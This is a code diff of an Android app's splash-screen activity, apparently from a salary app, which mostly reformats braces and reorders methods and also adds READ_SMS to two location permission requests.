@@ -31,52 +31,49 @@ import androidx.core.content.ContextCompat;
 
 import com.google.android.material.snackbar.Snackbar;
 
-import rutherfordit.com.instasalary.extras.IntroSliderActivity;
 import rutherfordit.com.instasalary.R;
 import rutherfordit.com.instasalary.extras.GpsTracker;
+import rutherfordit.com.instasalary.extras.IntroSliderActivity;
 
 public class SplashScreenActivity extends AppCompatActivity {
 
     Handler handler;
     SharedPreferences sharedPreferences;
     String status;
-    private int Request_location_permission = 100;
     ImageView logo;
     LinearLayout errorlayout;
     SharedPreferences sharedpreferences;
     String mypreference = "mySharedPreference";
+    private int Request_location_permission = 100;
+
+    public static void openPermissionSettings(Activity activity) {
+        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + activity.getPackageName()));
+        intent.addCategory(Intent.CATEGORY_DEFAULT);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        activity.startActivity(intent);
+    }
 
     @Override
     protected void onRestart() {
 
-        try
-        {
+        try {
             final LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
-            if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER))
-            {
+            if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                 buildAlertMessageNoGps();
-            }
-            else
-            {
-                if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED )
-                {
-                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, Request_location_permission);
-                }
-                else
-                {
-                    if (isNetworkAvailable())
-                    {
+            } else {
+                if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS}, Request_location_permission);
+                } else {
+                    if (isNetworkAvailable()) {
                         init();
-                    }
-                    else
-                    {
-                        Toast.makeText(getApplicationContext(),"Please Connect To Internet..",Toast.LENGTH_SHORT).show();
+                    } else {
+                        Toast.makeText(getApplicationContext(), "Please Connect To Internet..", Toast.LENGTH_SHORT).show();
                     }
                 }
             }
 
-        } catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
         super.onRestart();
@@ -101,9 +98,7 @@ public class SplashScreenActivity extends AppCompatActivity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             alert.getButton(DatePickerDialog.BUTTON_NEGATIVE).setTextColor(getColor(R.color.instapink));
             alert.getButton(DatePickerDialog.BUTTON_POSITIVE).setTextColor(getColor(R.color.instapink));
-        }
-        else
-        {
+        } else {
             alert.getButton(DatePickerDialog.BUTTON_NEGATIVE).setTextColor(Color.BLACK);
             alert.getButton(DatePickerDialog.BUTTON_POSITIVE).setTextColor(Color.BLACK);
         }
@@ -117,35 +112,25 @@ public class SplashScreenActivity extends AppCompatActivity {
         logo = findViewById(R.id.logo);
         errorlayout = findViewById(R.id.errorlayout);
 
-        try
-        {
+        try {
 
             final LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
-            if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER))
-            {
+            if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                 buildAlertMessageNoGps();
-            }
-            else
-            {
-                if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED )
-                {
+            } else {
+                if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                     ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, Request_location_permission);
-                }
-                else
-                {
-                    if (isNetworkAvailable())
-                    {
+                } else {
+                    if (isNetworkAvailable()) {
                         init();
-                    }
-                    else
-                    {
-                        Toast.makeText(getApplicationContext(),"Please Connect To Internet..",Toast.LENGTH_SHORT).show();
+                    } else {
+                        Toast.makeText(getApplicationContext(), "Please Connect To Internet..", Toast.LENGTH_SHORT).show();
                     }
                 }
             }
 
-        } catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
 
@@ -153,8 +138,7 @@ public class SplashScreenActivity extends AppCompatActivity {
 
     }
 
-    private void init()
-    {
+    private void init() {
 
         errorlayout.setVisibility(View.GONE);
         logo.setVisibility(View.VISIBLE);
@@ -163,8 +147,7 @@ public class SplashScreenActivity extends AppCompatActivity {
 
         GpsTracker gpsTracker = new GpsTracker(SplashScreenActivity.this);
 
-        if (gpsTracker.canGetLocation())
-        {
+        if (gpsTracker.canGetLocation()) {
             String latitude = String.valueOf(gpsTracker.getLatitude());
             String longitude = String.valueOf(gpsTracker.getLongitude());
 
@@ -175,9 +158,7 @@ public class SplashScreenActivity extends AppCompatActivity {
             editor.putString("longi", longitude);
             editor.apply();
 
-        }
-        else
-        {
+        } else {
             gpsTracker.showSettingsAlert();
         }
 
@@ -186,14 +167,11 @@ public class SplashScreenActivity extends AppCompatActivity {
             @Override
             public void run() {
 
-                if (status.equals("true"))
-                {
+                if (status.equals("true")) {
                     Intent intent = new Intent(SplashScreenActivity.this, MainActivity.class);
                     startActivity(intent);
                     finish();
-                }
-                else
-                {
+                } else {
                     Intent intent = new Intent(SplashScreenActivity.this, IntroSliderActivity.class);
                     startActivity(intent);
                     finish();
@@ -204,31 +182,21 @@ public class SplashScreenActivity extends AppCompatActivity {
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults)
-    {
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
 
-        if (requestCode == Request_location_permission){
+        if (requestCode == Request_location_permission) {
 
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
-            {
-                if (isNetworkAvailable())
-                {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                if (isNetworkAvailable()) {
                     init();
+                } else {
+                    Toast.makeText(getApplicationContext(), "Please Connect To Internet..", Toast.LENGTH_SHORT).show();
                 }
-                else
-                {
-                    Toast.makeText(getApplicationContext(),"Please Connect To Internet..",Toast.LENGTH_SHORT).show();
-                }
-            }
-            else
-            {
+            } else {
                 // permission was not granted
-                if (ActivityCompat.shouldShowRequestPermissionRationale(SplashScreenActivity.this, Manifest.permission.ACCESS_FINE_LOCATION))
-                {
-                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, Request_location_permission);
-                }
-                else
-                {
+                if (ActivityCompat.shouldShowRequestPermissionRationale(SplashScreenActivity.this, Manifest.permission.ACCESS_FINE_LOCATION)) {
+                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS}, Request_location_permission);
+                } else {
                     Snackbar snackbar = Snackbar.make(findViewById(android.R.id.content), getResources().getString(R.string.message_no_storage_permission_snackbar), Snackbar.LENGTH_LONG);
                     snackbar.setAction(getResources().getString(R.string.settings), new View.OnClickListener() {
                         @Override
@@ -245,14 +213,6 @@ public class SplashScreenActivity extends AppCompatActivity {
                 }
             }
         }
-    }
-
-    public static void openPermissionSettings(Activity activity)
-    {
-        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + activity.getPackageName()));
-        intent.addCategory(Intent.CATEGORY_DEFAULT);
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        activity.startActivity(intent);
     }
 
     public void openpermission(View view) {
